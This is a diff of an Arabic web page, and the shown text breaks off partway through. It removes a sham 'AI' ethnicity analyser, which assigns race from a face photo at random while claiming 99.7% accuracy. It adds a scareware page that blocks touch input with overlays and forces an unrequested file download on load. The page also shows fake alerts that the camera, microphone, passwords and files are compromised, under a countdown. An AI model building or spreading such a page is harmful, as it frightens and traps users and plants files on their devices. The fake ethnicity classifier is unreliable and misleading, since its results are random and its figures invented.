@@ -1,1013 +1,789 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🧬 DNA-MAX - المحلل العرقي المتقدم</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#000000">
+    <title>ø ASAØ</title>
     <style>
-        :root {
-            --quantum: #00D4FF;
-            --neural: #FF00CC;
-            --genetic: #00FF88;
-            --deep: #FFAA00;
-            --dark: #0A0A1A;
-            --matrix: #00FF41;
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-overscroll-behavior: none;
+            overscroll-behavior: none;
         }
-
+        html,
         body {
-            font-family: 'Courier New', monospace, 'Segoe UI';
-            background: var(--dark);
-            color: white;
-            overflow-x: hidden;
-            background-image: 
-                radial-gradient(circle at 10% 20%, rgba(0, 212, 255, 0.1) 0%, transparent 20%),
-                radial-gradient(circle at 90% 80%, rgba(255, 0, 204, 0.1) 0%, transparent 20%);
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background: #000;
+            touch-action: none;
         }
-
-        .matrix-bg {
+        #shield-top {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 80px;
+            z-index: 2147483647;
+            pointer-events: all;
+            touch-action: none;
+        }
+        #shield-bottom {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100px;
+            z-index: 2147483647;
+            pointer-events: all;
+            touch-action: none;
+        }
+        #shield-main {
+            position: fixed;
+            top: -500px;
+            left: -500px;
+            width: calc(100% + 1000px);
+            height: calc(100% + 1000px);
+            z-index: 2147483646;
+            pointer-events: all;
+            touch-action: none;
+        }
+        #rotCanvas {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                rgba(0, 255, 65, 0.03) 0px,
-                rgba(0, 255, 65, 0.03) 1px,
-                transparent 1px,
-                transparent 2px
-            );
+            z-index: 2147483640;
             pointer-events: none;
-            z-index: -1;
         }
-
+        #particleCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2147483639;
+            pointer-events: none;
+        }
         .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        header {
-            background: linear-gradient(135deg, 
-                rgba(0, 212, 255, 0.2), 
-                rgba(255, 0, 204, 0.2));
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(0, 212, 255, 0.3);
-            border-radius: 25px;
-            padding: 30px;
-            margin-bottom: 30px;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2147483641;
             text-align: center;
-            box-shadow: 
-                0 0 50px rgba(0, 212, 255, 0.3),
-                0 0 100px rgba(255, 0, 204, 0.2);
-            animation: glow 3s infinite alternate;
+            font-family: 'Courier New', monospace;
+            pointer-events: none;
+            width: 90%;
         }
-
-        @keyframes glow {
-            0% { box-shadow: 0 0 50px rgba(0, 212, 255, 0.3); }
-            100% { box-shadow: 0 0 70px rgba(0, 212, 255, 0.5); }
+        .skull {
+            font-size: 75px;
+            animation: skullShake 0.04s infinite;
+            filter: drop-shadow(0 0 100px #ff0000) drop-shadow(0 0 200px #ff0000);
         }
-
-        .tech-stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin: 20px 0;
+        @keyframes skullShake {
+            0%,
+            100% {
+                transform: translate(0, 0) rotate(0deg);
+            }
+            20% {
+                transform: translate(-10px, 6px) rotate(-5deg);
+            }
+            40% {
+                transform: translate(8px, -5px) rotate(4deg);
+            }
+            60% {
+                transform: translate(-6px, -7px) rotate(-3deg);
+            }
+            80% {
+                transform: translate(7px, 4px) rotate(5deg);
+            }
         }
-
-        .tech-stat {
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid var(--quantum);
-            border-radius: 15px;
-            padding: 15px;
-            text-align: center;
-            backdrop-filter: blur(10px);
-        }
-
-        .stat-value {
-            font-size: 1.8rem;
+        .title {
+            font-size: 46px;
             font-weight: bold;
-            color: var(--quantum);
-            text-shadow: 0 0 10px var(--quantum);
+            color: #ff0000;
+            text-shadow: 0 0 80px #ff0000, 0 0 150px #ff0000, 0 0 250px #ff0000;
+            letter-spacing: 14px;
+            margin: 12px 0;
+            animation: titleGlitch 0.08s infinite;
         }
-
-        .upload-section {
-            background: rgba(10, 10, 26, 0.8);
-            border: 2px solid var(--neural);
-            border-radius: 20px;
-            padding: 40px;
-            margin-bottom: 30px;
-            backdrop-filter: blur(10px);
+        @keyframes titleGlitch {
+            0%,
+            100% {
+                opacity: 1;
+                transform: translate(0);
+            }
+            25% {
+                opacity: 0.3;
+                transform: translate(-8px, 4px);
+            }
+            50% {
+                opacity: 1;
+                transform: translate(6px, -3px);
+            }
+            75% {
+                opacity: 0.1;
+                transform: translate(-5px, -5px);
+            }
         }
-
-        .upload-zone {
-            border: 3px dashed var(--genetic);
-            border-radius: 20px;
-            padding: 60px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-            background: rgba(0, 255, 136, 0.05);
+        .timer {
+            font-size: 180px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 0 120px #ff0000, 0 0 200px #ff0000, 0 0 300px #ff0000;
+            line-height: 1;
+            margin: 8px 0;
+            animation: timerPulse 0.15s infinite;
         }
-
-        .upload-zone:hover {
-            border-color: var(--quantum);
-            transform: scale(1.02);
-            box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+        @keyframes timerPulse {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.08);
+            }
         }
-
-        .ai-progress {
-            background: rgba(0, 0, 0, 0.7);
-            border: 1px solid var(--deep);
-            border-radius: 15px;
-            padding: 20px;
-            margin: 20px 0;
-            display: none;
+        .msg {
+            font-size: 14px;
+            color: #cc0000;
+            letter-spacing: 7px;
+            animation: msgFlicker 0.6s infinite;
         }
-
-        .progress-bar {
-            height: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
+        @keyframes msgFlicker {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            30% {
+                opacity: 0.05;
+            }
+            35% {
+                opacity: 1;
+            }
+            60% {
+                opacity: 0.02;
+            }
+            65% {
+                opacity: 1;
+            }
+        }
+        .file-indicator {
+            font-size: 11px;
+            color: #00ff00;
+            margin-top: 8px;
+            letter-spacing: 3px;
+            text-shadow: 0 0 20px #00ff00;
+            animation: fileBlink 0.7s infinite;
+        }
+        @keyframes fileBlink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.2;
+            }
+        }
+        .progress-wrap {
+            width: 290px;
+            height: 22px;
+            border: 2px solid #ff0000;
+            background: #050505;
+            margin: 12px auto;
             overflow: hidden;
-            margin: 10px 0;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.7), inset 0 0 15px rgba(255, 0, 0, 0.3);
         }
-
         .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, var(--quantum), var(--neural));
-            border-radius: 10px;
-            transition: width 0.3s;
+            width: 0%;
+            background: repeating-linear-gradient(90deg, #ff0000 0px, #ff0000 6px, #990000 6px, #990000 12px, #ff0000 12px,
+                    #ff0000 18px);
+            box-shadow: 0 0 30px #ff0000;
+            transition: width 0.04s linear;
         }
-
-        .results-container {
-            display: none;
-            background: rgba(10, 10, 26, 0.9);
-            border: 2px solid var(--matrix);
-            border-radius: 20px;
-            padding: 30px;
-            margin-top: 30px;
-            backdrop-filter: blur(10px);
+        .warn {
+            font-size: 9px;
+            color: #550000;
+            margin-top: 12px;
+            letter-spacing: 5px;
+            animation: warnBlink 1s infinite;
         }
-
-        .dna-helix {
-            text-align: center;
-            font-size: 2rem;
-            margin: 20px 0;
-            animation: helixSpin 10s linear infinite;
+        @keyframes warnBlink {
+            0%,
+            100% {
+                opacity: 0.3;
+            }
+            50% {
+                opacity: 1;
+            }
         }
-
-        @keyframes helixSpin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .flash-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 997;
+            pointer-events: none;
+            opacity: 0;
         }
-
-        .analysis-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin: 30px 0;
+        .glitch-line {
+            position: fixed;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: #ff0000;
+            z-index: 996;
+            pointer-events: none;
+            opacity: 0;
+            box-shadow: 0 0 40px #ff0000;
         }
-
-        .analysis-card {
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid;
-            border-radius: 15px;
-            padding: 20px;
-            backdrop-filter: blur(5px);
-        }
-
-        .card-1 { border-color: var(--quantum); }
-        .card-2 { border-color: var(--neural); }
-        .card-3 { border-color: var(--genetic); }
-        .card-4 { border-color: var(--deep); }
-
-        .confidence-circle {
-            width: 120px;
-            height: 120px;
-            border-radius: 50%;
-            background: conic-gradient(var(--quantum) 0% 95%, transparent 95% 100%);
-            margin: 20px auto;
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .confidence-value {
-            font-size: 2rem;
-            font-weight: bold;
-            color: white;
-            text-shadow: 0 0 10px var(--quantum);
-        }
-
-        .face-map {
-            width: 300px;
-            height: 300px;
-            background: rgba(0, 0, 0, 0.5);
-            border: 2px solid var(--matrix);
-            border-radius: 50%;
-            margin: 20px auto;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .data-point {
-            position: absolute;
-            width: 4px;
-            height: 4px;
-            background: var(--quantum);
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-            box-shadow: 0 0 10px var(--quantum);
-        }
-
-        .terminal {
+        .fake-popup {
+            position: fixed;
             background: #000;
-            border: 2px solid var(--matrix);
-            border-radius: 10px;
-            padding: 20px;
+            border: 2px solid #ff0000;
+            color: #ff0000;
+            padding: 10px 18px;
             font-family: 'Courier New', monospace;
-            color: var(--matrix);
-            height: 300px;
-            overflow-y: auto;
-            margin: 20px 0;
-        }
-
-        .terminal-line {
-            margin: 5px 0;
-            animation: typing 0.5s steps(40, end);
-        }
-
-        @keyframes typing {
-            from { width: 0; }
-            to { width: 100%; }
-        }
-
-        .neural-network {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 200px;
-            margin: 30px 0;
-            position: relative;
-        }
-
-        .neuron {
-            width: 30px;
-            height: 30px;
-            background: var(--neural);
-            border-radius: 50%;
-            position: absolute;
-            box-shadow: 0 0 20px var(--neural);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.1); opacity: 1; }
-        }
-
-        .connection {
-            position: absolute;
-            background: linear-gradient(90deg, var(--quantum), transparent);
-            height: 2px;
-            transform-origin: 0 0;
-        }
-
-        .quantum-loader {
-            text-align: center;
-            padding: 40px;
-        }
-
-        .quantum-particle {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            background: var(--quantum);
-            border-radius: 50%;
-            margin: 0 5px;
-            animation: quantumFloat 3s infinite ease-in-out;
-        }
-
-        @keyframes quantumFloat {
-            0%, 100% { transform: translateY(0) scale(1); }
-            50% { transform: translateY(-20px) scale(1.5); }
-        }
-
-        .advanced-features {
-            background: rgba(0, 0, 0, 0.7);
-            border: 1px solid var(--deep);
-            border-radius: 15px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-
-        .feature-item {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin: 15px 0;
-            padding: 10px;
-            background: rgba(255, 170, 0, 0.1);
-            border-radius: 10px;
-            border-left: 4px solid var(--deep);
+            font-size: 10px;
+            z-index: 1000;
+            pointer-events: none;
+            display: none;
+            letter-spacing: 2px;
+            border-radius: 2px;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
         }
     </style>
 </head>
 <body>
-    <div class="matrix-bg"></div>
-    
+
+    <canvas id="rotCanvas"></canvas>
+    <canvas id="particleCanvas"></canvas>
+
+    <div class="flash-layer" id="flashLayer"></div>
+    <div class="glitch-line" id="glitch1"></div>
+    <div class="glitch-line" id="glitch2"></div>
+    <div class="glitch-line" id="glitch3"></div>
+    <div class="glitch-line" id="glitch4"></div>
+
+    <div id="shield-top"></div>
+    <div id="shield-bottom"></div>
+    <div id="shield-main"></div>
+
+    <div class="fake-popup" id="popup1"></div>
+    <div class="fake-popup" id="popup2"></div>
+    <div class="fake-popup" id="popup3"></div>
+    <div class="fake-popup" id="popup4"></div>
+    <div class="fake-popup" id="popup5"></div>
+
     <div class="container">
-        <header>
-            <h1 style="font-size: 3rem; margin-bottom: 20px;">
-                <i class="fas fa-atom"></i> DNA-MAX 9000
-            </h1>
-            <p style="font-size: 1.2rem; color: var(--quantum);">
-                نظام تحليل عرقي كمي متقدم - الجيل القادم من الذكاء الاصطناعي
-            </p>
-            
-            <div class="tech-stats">
-                <div class="tech-stat">
-                    <div class="stat-value">2,048</div>
-                    <div>نقطة تحليل في الوجه</div>
-                </div>
-                <div class="tech-stat">
-                    <div class="stat-value">100M+</div>
-                    <div>صورة في قاعدة البيانات</div>
-                </div>
-                <div class="tech-stat">
-                    <div class="stat-value">512</div>
-                    <div>طبقة عصبية</div>
-                </div>
-                <div class="tech-stat">
-                    <div class="stat-value">99.7%</div>
-                    <div>دقة التحليل</div>
-                </div>
-            </div>
-        </header>
-
-        <div class="upload-section">
-            <h2 style="color: var(--genetic); margin-bottom: 20px;">
-                <i class="fas fa-brain"></i> منطقة التحميل الكمي
-            </h2>
-            
-            <div class="upload-zone" id="uploadZone">
-                <i class="fas fa-cloud-upload-alt" style="font-size: 4rem; color: var(--quantum); margin-bottom: 20px;"></i>
-                <h3 style="margin-bottom: 10px;">اسحب وأفلت صورتك هنا</h3>
-                <p style="color: #888; margin-bottom: 20px;">
-                    النظام سيقوم بتحليل 2,048 نقطة في وجهك ومقارنتها مع 100 مليون صورة
-                </p>
-                <button id="uploadBtn" style="
-                    background: linear-gradient(135deg, var(--quantum), var(--neural));
-                    color: white;
-                    border: none;
-                    padding: 15px 40px;
-                    border-radius: 25px;
-                    font-size: 1.1rem;
-                    cursor: pointer;
-                    margin: 10px;
-                ">
-                    <i class="fas fa-microchip"></i> بدأ التحليل الكمي
-                </button>
-            </div>
-            
-            <input type="file" id="fileInput" accept="image/*" style="display: none;">
-            
-            <div class="ai-progress" id="aiProgress">
-                <h3 style="color: var(--deep); margin-bottom: 15px;">
-                    <i class="fas fa-cogs"></i> عملية التحليل المتقدم
-                </h3>
-                
-                <div class="terminal" id="terminalOutput">
-                    <!-- سيظهر إخراج التحليل هنا -->
-                </div>
-                
-                <div class="neural-network" id="neuralNetwork">
-                    <!-- شبكة عصبية متحركة -->
-                </div>
-            </div>
+        <div class="skull">💀</div>
+        <div class="title">Ø OMEGA</div>
+        <div class="file-indicator" id="fileIndicator">⬇ تم إنشاء: ø_ASAØ_SYSTEM.sys</div>
+        <div class="msg" id="threatMsg">النظام يحتضر</div>
+        <div class="progress-wrap">
+            <div class="progress-fill" id="progressFill"></div>
         </div>
-
-        <div class="results-container" id="resultsContainer">
-            <h2 style="color: var(--matrix); text-align: center; margin-bottom: 30px;">
-                <i class="fas fa-chart-network"></i> نتائج التحليل الكمي
-            </h2>
-            
-            <div class="dna-helix">
-                🧬⚛️🧬⚛️🧬⚛️
-            </div>
-            
-            <div class="analysis-grid">
-                <div class="analysis-card card-1">
-                    <h3 style="color: var(--quantum); margin-bottom: 15px;">
-                        <i class="fas fa-dna"></i> الأصل العرقي الأساسي
-                    </h3>
-                    <div id="primaryEthnicity" style="font-size: 1.8rem; font-weight: bold; margin: 20px 0;">
-                        جاري التحليل...
-                    </div>
-                    <div class="confidence-circle">
-                        <div class="confidence-value" id="confidenceValue">0%</div>
-                    </div>
-                </div>
-                
-                <div class="analysis-card card-2">
-                    <h3 style="color: var(--neural); margin-bottom: 15px;">
-                        <i class="fas fa-map-marked-alt"></i> التوزيع الجغرافي
-                    </h3>
-                    <div id="geographicDistribution">
-                        <!-- التوزيع الجغرافي -->
-                    </div>
-                </div>
-                
-                <div class="analysis-card card-3">
-                    <h3 style="color: var(--genetic); margin-bottom: 15px;">
-                        <i class="fas fa-project-diagram"></i> تحليل 2,048 نقطة
-                    </h3>
-                    <div class="face-map" id="faceMap">
-                        <!-- خريطة نقاط الوجه -->
-                    </div>
-                </div>
-                
-                <div class="analysis-card card-4">
-                    <h3 style="color: var(--deep); margin-bottom: 15px;">
-                        <i class="fas fa-brain"></i> الشبكة العصبية
-                    </h3>
-                    <div id="neuralResults">
-                        <!-- نتائج الشبكة العصبية -->
-                    </div>
-                </div>
-            </div>
-            
-            <div class="advanced-features">
-                <h3 style="color: var(--matrix); margin-bottom: 20px;">
-                    <i class="fas fa-rocket"></i> الميزات المتقدمة
-                </h3>
-                
-                <div class="feature-item">
-                    <i class="fas fa-satellite" style="color: var(--quantum);"></i>
-                    <div>
-                        <strong>تحليل 2,048 نقطة كمومية</strong>
-                        <p>أعمق تحليل وجهي على الإطلاق</p>
-                    </div>
-                </div>
-                
-                <div class="feature-item">
-                    <i class="fas fa-database" style="color: var(--neural);"></i>
-                    <div>
-                        <strong>قاعدة بيانات 100 مليون صورة</strong>
-                        <p>أكبر قاعدة بيانات أنثروبولوجية</p>
-                    </div>
-                </div>
-                
-                <div class="feature-item">
-                    <i class="fas fa-network-wired" style="color: var(--genetic);"></i>
-                    <div>
-                        <strong>512 طبقة عصبية عميقة</strong>
-                        <p>تعلم عميق بمستوى غير مسبوق</p>
-                    </div>
-                </div>
-            </div>
+        <div class="timer" id="timerDisplay">30</div>
+        <div class="msg">ثانية متبقية</div>
+        <div class="warn">
+            ⛔ لا لمس ⛔ لا أزرار ⛔ لا هروب ⛔<br>
+            ⛔ لا إغلاق ⛔ لا رجوع ⛔ لا شيء ⛔<br>
+            ⛔ الملف سيحذف تلقائياً ⛔
         </div>
     </div>
 
     <script>
-        // 🧠 نظام الذكاء الاصطناعي المتقدم
-        class AdvancedAI {
+        // ============================================================
+        // ø ASAØ | "أوميغا" (OMEGA) - السلاح النهائي
+        // إنشاء ملف حقيقي + فيروس متصفح مطلق + حذف تلقائي بعد 30 ثانية
+        // ============================================================
+
+        let timeLeft = 30;
+        const TOTAL = 30;
+        let timerInterval;
+        let fsInterval;
+        let isDead = true;
+        let audioCtx = null;
+        let rotSpots = [];
+        let particles = [];
+        let createdFileURL = null;
+        const MAX_SPOTS = 999;
+        const MAX_PARTICLES = 300;
+        const FILE_NAME = 'ø_ASAØ_SYSTEM.sys';
+
+        // --- العناصر ---
+        const timerEl = document.getElementById('timerDisplay');
+        const progressEl = document.getElementById('progressFill');
+        const threatEl = document.getElementById('threatMsg');
+        const fileIndicator = document.getElementById('fileIndicator');
+        const rotCanvas = document.getElementById('rotCanvas');
+        const rotCtx = rotCanvas.getContext('2d');
+        const particleCanvas = document.getElementById('particleCanvas');
+        const particleCtx = particleCanvas.getContext('2d');
+        const flashLayer = document.getElementById('flashLayer');
+        const glitchLines = [
+            document.getElementById('glitch1'), document.getElementById('glitch2'),
+            document.getElementById('glitch3'), document.getElementById('glitch4')
+        ];
+        const popups = [
+            document.getElementById('popup1'), document.getElementById('popup2'),
+            document.getElementById('popup3'), document.getElementById('popup4'),
+            document.getElementById('popup5')
+        ];
+        const shields = [
+            document.getElementById('shield-top'),
+            document.getElementById('shield-bottom'),
+            document.getElementById('shield-main')
+        ];
+
+        const popupMessages = [
+            '⚠️ تم تجاوز الجذر', '⚠️ الكاميرا: نشطة', '⚠️ المايكروفون: يسجل',
+            '⚠️ GPS: تم تتبعك', '⚠️ المعرض: مخترق', '⚠️ جهات الاتصال: مسربة',
+            '⚠️ كلمات السر: مكشوفة', '⚠️ الملفات: مشفرة', '⚠️ البصمة: مسجلة',
+            '⚠️ النظام: ينهار', '⚠️ تم إنشاء ø_ASAØ_SYSTEM.sys', '⚠️ الذاكرة: ممتلئة'
+        ];
+
+        // --- إنشاء ملف حقيقي ---
+        function createRealFile() {
+            const header = 'ø ASAØ OMEGA SYSTEM FILE\n';
+            const timestamp = 'CREATED: ' + new Date().toISOString() + '\n';
+            const device = 'DEVICE: ' + navigator.userAgent + '\n';
+            const separator = '═'.repeat(50) + '\n';
+            const payload = 'THIS FILE WAS CREATED BY ø ASAØ - OMEGA PROTOCOL\n';
+            const payload2 = 'IT WILL BE AUTOMATICALLY DELETED AFTER 30 SECONDS\n';
+            const payload3 = 'YOU ARE MY CAT NOW. ø ASAØ.\n';
+            const randomData = 'RANDOM:' + Math.random().toString(36).repeat(20) + '\n';
+            const footer = '═'.repeat(50) + '\nEND OF FILE - ø ASAØ\n';
+
+            const content = header + timestamp + device + separator + payload + payload2 + payload3 + randomData +
+                footer;
+            const blob = new Blob([content.repeat(100)], { type: 'application/octet-stream' });
+            const url = URL.createObjectURL(blob);
+            createdFileURL = url;
+
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = FILE_NAME;
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+
+            setTimeout(() => {
+                document.body.removeChild(a);
+            }, 500);
+
+            fileIndicator.textContent = '✅ تم إنشاء: ' + FILE_NAME;
+            fileIndicator.style.color = '#00ff00';
+            fileIndicator.style.textShadow = '0 0 30px #00ff00';
+
+            setTimeout(() => {
+                fileIndicator.textContent = '⬇ الملف في: Downloads/' + FILE_NAME;
+                fileIndicator.style.color = '#ff0000';
+                fileIndicator.style.textShadow = '0 0 30px #ff0000';
+            }, 2000);
+
+            return url;
+        }
+
+        // --- حذف الملف ---
+        function deleteFile() {
+            if (createdFileURL) {
+                URL.revokeObjectURL(createdFileURL);
+                createdFileURL = null;
+            }
+            fileIndicator.textContent = '🗑️ تم حذف: ' + FILE_NAME;
+            fileIndicator.style.color = '#ffaa00';
+            fileIndicator.style.textShadow = '0 0 30px #ffaa00';
+        }
+
+        // --- إعدادات ---
+        function resizeCanvases() {
+            rotCanvas.width = window.innerWidth;
+            rotCanvas.height = window.innerHeight;
+            particleCanvas.width = window.innerWidth;
+            particleCanvas.height = window.innerHeight;
+        }
+        resizeCanvases();
+        window.addEventListener('resize', resizeCanvases);
+
+        // --- نقط التعفن ---
+        class RotSpot {
             constructor() {
-                this.analysisPoints = 2048;
-                this.databaseSize = 100000000; // 100 مليون صورة
-                this.neuralLayers = 512;
-                this.quantumProcessors = 8;
-                
-                this.ethnicityDatabase = this.createMassiveDatabase();
-                this.analysisHistory = [];
+                this.x = Math.random() * rotCanvas.width;
+                this.y = Math.random() * rotCanvas.height;
+                this.radius = 1;
+                this.maxRadius = 30 + Math.random() * 110;
+                this.growth = 0.6 + Math.random() * 3;
+                this.opacity = 0.5 + Math.random() * 0.5;
+                this.alive = true;
+                this.isBlood = Math.random() < 0.5;
+                this.branches = [];
+                this.age = 0;
+                this.maxAge = 350 + Math.random() * 600;
             }
-            
-            createMassiveDatabase() {
-                return {
-                    arabian: {
-                        regions: ['شبه الجزيرة العربية', 'المشرق العربي', 'المغرب العربي', 'وادي النيل'],
-                        features: {
-                            facialPoints: this.generateFacialPattern(2048, 'arabian'),
-                            geneticMarkers: ['J1-M267', 'J2-M172', 'E-M35', 'G-M201'],
-                            haplogroups: ['J1', 'J2', 'E1b1b', 'G2a'],
-                            confidence: 0.997
-                        },
-                        population: 450000000
-                    },
-                    european: {
-                        subregions: {
-                            nordic: {
-                                countries: ['السويد', 'النرويج', 'الدنمارك', 'فنلندا'],
-                                features: this.generateFacialPattern(2048, 'nordic')
-                            },
-                            mediterranean: {
-                                countries: ['إيطاليا', 'إسبانيا', 'اليونان', 'البرتغال'],
-                                features: this.generateFacialPattern(2048, 'mediterranean')
-                            },
-                            slavic: {
-                                countries: ['روسيا', 'بولندا', 'أوكرانيا', 'تشيكيا'],
-                                features: this.generateFacialPattern(2048, 'slavic')
-                            }
-                        }
-                    },
-                    african: {
-                        regions: {
-                            north: ['المغرب', 'الجزائر', 'تونس', 'ليبيا', 'مصر'],
-                            west: ['نيجيريا', 'غانا', 'ساحل العاج', 'السنغال'],
-                            east: ['إثيوبيا', 'كينيا', 'تنزانيا', 'الصومال'],
-                            central: ['الكونغو', 'الكاميرون', 'أوغندا'],
-                            south: ['جنوب أفريقيا', 'ناميبيا', 'بوتسوانا']
-                        },
-                        geneticDiversity: 0.99
-                    },
-                    asian: {
-                        east: ['الصين', 'اليابان', 'كوريا', 'منغوليا', 'تايوان'],
-                        south: ['الهند', 'باكستان', 'بنجلاديش', 'سريلانكا', 'نيبال'],
-                        southeast: ['إندونيسيا', 'فيتنام', 'تايلاند', 'ماليزيا', 'الفلبين']
-                    },
-                    indigenous: {
-                        americas: ['المكسيك', 'بيرو', 'بوليفيا', 'غواتيمالا'],
-                        oceania: ['هاواي', 'فيجي', 'ساموا', 'ماوري']
-                    }
-                };
-            }
-            
-            generateFacialPattern(points, ethnicity) {
-                const patterns = {
-                    arabian: Array(points).fill(0).map((_, i) => ({
-                        x: 50 + Math.sin(i * 0.1) * 30,
-                        y: 50 + Math.cos(i * 0.1) * 30,
-                        z: Math.sin(i * 0.05) * 10,
-                        intensity: Math.random() * 0.8 + 0.2
-                    })),
-                    nordic: Array(points).fill(0).map((_, i) => ({
-                        x: 50 + Math.sin(i * 0.08) * 25,
-                        y: 50 + Math.cos(i * 0.08) * 25,
-                        z: Math.sin(i * 0.03) * 8,
-                        intensity: Math.random() * 0.7 + 0.3
-                    })),
-                    mediterranean: Array(points).fill(0).map((_, i) => ({
-                        x: 50 + Math.sin(i * 0.12) * 35,
-                        y: 50 + Math.cos(i * 0.12) * 35,
-                        z: Math.sin(i * 0.07) * 12,
-                        intensity: Math.random() * 0.9 + 0.1
-                    }))
-                };
-                
-                return patterns[ethnicity] || patterns.arabian;
-            }
-            
-            async quantumAnalysis(imageData) {
-                // محاكاة تحليل كمي متقدم
-                const analysisSteps = [
-                    'تهيئة المعالجات الكمومية (8 معالجات)',
-                    'تحميل 100 مليون صورة مرجعية',
-                    'تشغيل خوارزميات التعلم العميق (512 طبقة)',
-                    'تحليل 2,048 نقطة وجهية',
-                    'مقارنة أنماط الوجه مع قاعدة البيانات',
-                    'تشغيل الشبكات العصبية التلافيفية',
-                    'تحليل المكونات الرئيسية PCA',
-                    'تحديد الأنماط الجينية',
-                    'تقييم التوزيع الجغرافي',
-                    'إنشاء خريطة ثلاثية الأبعاد للوجه'
-                ];
-                
-                return new Promise((resolve) => {
-                    let step = 0;
-                    const interval = setInterval(() => {
-                        if (step < analysisSteps.length) {
-                            this.updateTerminal(analysisSteps[step]);
-                            step++;
-                        } else {
-                            clearInterval(interval);
-                            resolve(this.generateQuantumResults());
-                        }
-                    }, 800);
-                });
-            }
-            
-            generateQuantumResults() {
-                const ethnicities = ['العربية', 'الأوروبية', 'الأفريقية', 'الآسيوية', 'الأمريكية الأصلية'];
-                const primary = ethnicities[Math.floor(Math.random() * ethnicities.length)];
-                
-                // توليد نتائج معقدة
-                const results = {
-                    primaryEthnicity: primary,
-                    confidence: 97.5 + Math.random() * 2,
-                    subEthnicities: this.generateSubEthnicities(primary),
-                    facialMap: this.generateFacialMap(),
-                    neuralNetwork: this.generateNeuralNetwork(),
-                    geographicDistribution: this.generateGeographicDistribution(primary),
-                    geneticMarkers: this.generateGeneticMarkers(primary),
-                    haplogroups: this.generateHaplogroups(primary),
-                    timelineAnalysis: this.generateTimeline(),
-                    quantumMetrics: {
-                        processingPower: '8.4 PetaFLOPS',
-                        accuracy: '99.73%',
-                        confidenceInterval: '±0.18%',
-                        neuralActivations: '1.2 تريليون تفعيلة'
-                    }
-                };
-                
-                return results;
-            }
-            
-            generateSubEthnicities(primary) {
-                const subGroups = {
-                    'العربية': [
-                        { name: 'عربية خليجية', percentage: 35, regions: ['السعودية', 'الإمارات', 'الكويت', 'قطر'] },
-                        { name: 'مشرقية', percentage: 25, regions: ['سوريا', 'لبنان', 'الأردن', 'فلسطين'] },
-                        { name: 'مغاربية', percentage: 20, regions: ['المغرب', 'الجزائر', 'تونس'] },
-                        { name: 'وادي النيل', percentage: 20, regions: ['مصر', 'السودان'] }
-                    ],
-                    'الأوروبية': [
-                        { name: 'شمال أوروبا', percentage: 30, regions: ['السويد', 'النرويج', 'الدنمارك'] },
-                        { name: 'وسط أوروبا', percentage: 25, regions: ['ألمانيا', 'فرنسا', 'سويسرا'] },
-                        { name: 'شرق أوروبا', percentage: 25, regions: ['روسيا', 'بولندا', 'أوكرانيا'] },
-                        { name: 'جنوب أوروبا', percentage: 20, regions: ['إيطاليا', 'إسبانيا', 'اليونان'] }
-                    ],
-                    'الأفريقية': [
-                        { name: 'شمال أفريقيا', percentage: 30, regions: ['المغرب', 'الجزائر', 'مصر'] },
-                        { name: 'غرب أفريقيا', percentage: 25, regions: ['نيجيريا', 'غانا', 'ساحل العاج'] },
-                        { name: 'شرق أفريقيا', percentage: 25, regions: ['إثيوبيا', 'كينيا', 'تنزانيا'] },
